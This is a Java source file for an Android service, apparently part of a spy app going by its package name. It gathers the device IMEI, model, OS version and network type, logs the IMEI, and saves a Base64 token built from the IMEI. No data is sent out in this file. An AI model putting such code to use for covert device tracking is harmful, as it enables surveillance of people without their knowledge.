package com.app.spyapp.service;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.app.spyapp.helper.APIService;
import com.app.spyapp.helper.APIUtils;
import com.app.spyapp.helper.ConstantData;
import com.app.spyapp.model.GeneralModel;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.Map;


public class GetgeneralInfoService extends IntentService {
    private APIService apiService;
    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor;

    public GetgeneralInfoService() {
        super(GetgeneralInfoService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        apiService = APIUtils.getAPIService();
        sharedPreferences = getSharedPreferences(ConstantData.PREF_NAME, MODE_PRIVATE);
        editor = sharedPreferences.edit();
        getGeneralInfo();
    }

    public void getGeneralInfo() {

        TelephonyManager mngr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        String IMEI = mngr.getDeviceId();
        String model = Build.MODEL;
        GeneralModel generalModel = new GeneralModel();
        generalModel.setIMEI(IMEI);
        generalModel.setModelNumber(model);
        generalModel.setOSVersion(String.valueOf(Build.VERSION.SDK_INT));
        generalModel.setConnectionType(checkNetworkStatus(this));

        Log.i("Debug", "getGeneralInfo: IMEI ="+IMEI+"\n"+"model="+model+"\n");
        String email = "test@gmail.com";

        final Map<String,Object> requestBodyMap = new HashMap<>();
        requestBodyMap.put("email", email.trim());
        requestBodyMap.put("imei1", IMEI.trim());

        JSONObject jsonObject = new JSONObject(requestBodyMap);
        String json = jsonObject.toString().trim();
        byte[] bytes = null;
        try {
            bytes = json.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }


        try {
            String cleanString = new String(Base64.encode(bytes, Base64.DEFAULT), "UTF-8");
            String token = cleanString.replaceAll("\n", "");
            editor.putString(ConstantData.TOKEN,token);
            editor.commit();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public String checkNetworkStatus(final Context context) {

        String networkStatus = "";

        // Get connect mangaer
        final ConnectivityManager connMgr = (ConnectivityManager)
                context.getSystemService(Context.CONNECTIVITY_SERVICE);

        // check for wifi
        final android.net.NetworkInfo wifi = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        // check for mobile data
        final android.net.NetworkInfo mobile = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

        if (wifi.isAvailable()) {
            networkStatus = "wifi";
        } else if (mobile.isAvailable()) {
            networkStatus = "mobileData";
        } else {
            networkStatus = "noNetwork";
        }
        return networkStatus;
    }
}
